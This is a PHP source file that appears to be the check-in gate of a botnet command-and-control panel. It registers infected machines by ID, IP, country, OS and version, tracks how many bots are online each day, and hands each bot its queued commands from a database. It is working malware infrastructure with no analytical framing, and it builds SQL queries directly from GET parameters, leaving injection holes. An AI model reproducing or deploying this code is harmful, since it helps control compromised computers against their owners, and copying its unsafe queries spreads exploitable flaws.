<?php
	//sql connection
	define ( "vnLoader" , '' );
	include("../sql.inc.php");
	

	//variables
	$IP = $_SERVER['REMOTE_ADDR']; 
	$cntry = IPtoCountry($IP);

	$Time = strtotime( gmdate("M d Y H:i:s") );
	$reg = 0;
	$OS = $_GET['os'];

	//count online bots
	$count = mysql_query("SELECT Count(ID) FROM botlist WHERE LastPing > " . strtotime( gmdate("M d Y") ));
	while($rows = mysql_fetch_array($count)) 
		{
		$online = $rows[0];
		}


	$result = mysql_query("SELECT * FROM charts");
	while($rows = mysql_fetch_array($result))
		{
		$lastdate = $rows['date'];
		$curbots = $rows['bots'];
		}

	$curdate = gmdate("d.m.Y");

	if ($lastdate != $curdate) 
		{
		mysql_query("INSERT INTO charts (bots , date) VALUES ('".$online."' , '".$curdate."')");
		}
	 elseif ($lastdate == $curdate) 
		{
		if ($curbots < $online) 
			{
			mysql_query("UPDATE charts SET bots='".$online."' WHERE date='".$curdate."'");
			}
		}
	
	$result = mysql_query("SELECT * FROM botlist");
	while($rows = mysql_fetch_array($result)) {
		if ($rows['ID'] == $_GET['id']) {
			$reg = 1;
		}
	}
	
	if ( $reg == 0 ) {
		$sql = "INSERT INTO botlist (ID, IP, COUNTRY ,OS, LastPing, VERSION) VALUES ('" . $_GET['id'] . "', '" . $IP . "', '" . $cntry . "', '" . $OS . "', '" . $Time . "' , '" . $_GET['ver'] . "');";
		mysql_query ($sql);
	} else { 
		mysql_query ("UPDATE botlist SET LastPing='". $Time ."' WHERE ID='". $_GET['id'] ."'");
		mysql_query ("UPDATE botlist SET IP='". $IP ."' WHERE ID='". $_GET['id'] ."'");
		mysql_query ("UPDATE botlist SET COUNTRY='". $cntry ."' WHERE ID='". $_GET['id'] ."'");
		mysql_query ("UPDATE botlist SET OS='". $OS ."' WHERE ID='". $_GET['id'] ."'");
		mysql_query ("UPDATE botlist SET VERSION='". $_GET['ver'] ."' WHERE ID='". $_GET['id'] ."'");
	}

	
	//get commands
	$result = mysql_query("SELECT * FROM commands");
	while($rows = mysql_fetch_array($result))
		{
		$pos = strpos ( $rows['bots'] , $_GET['id']);
		if ($pos !== false) 
			{
			$commands .= $rows['cmd'] . '#' . $rows['param'] . "\n";
			}
		else
			{
			if ( $rows['bots'] == '*' ) 
				{
				$commands .= $rows['cmd'] . '#' . $rows['param'] . "\n";
				}
			}
		}
	print "<commands>";
	print "A#" . gmdate("d.m.Y H:i:s") . "\n";
	print $commands;
	print "</commands>";

	function IPtoCountry($IP) 
		{
		//http://www.it-academy.cc/article/1467/PHP:+Herkunft+einer+IPAdresse+ermitteln.html
		$IP = sprintf("%u",IP2Long($IP));
		$result = mysql_query("SELECT name FROM IPtoCountry WHERE IP_from <= $IP AND IP_to >= $IP LIMIT 1");
		
		if(mysql_num_rows($result) == 0) 
			{
			$land = "UNKNOWN";
			} 
		else 
			{
			$row = mysql_fetch_object($result);
			$land = $row->name;
			}	
		return $land;
		}

?>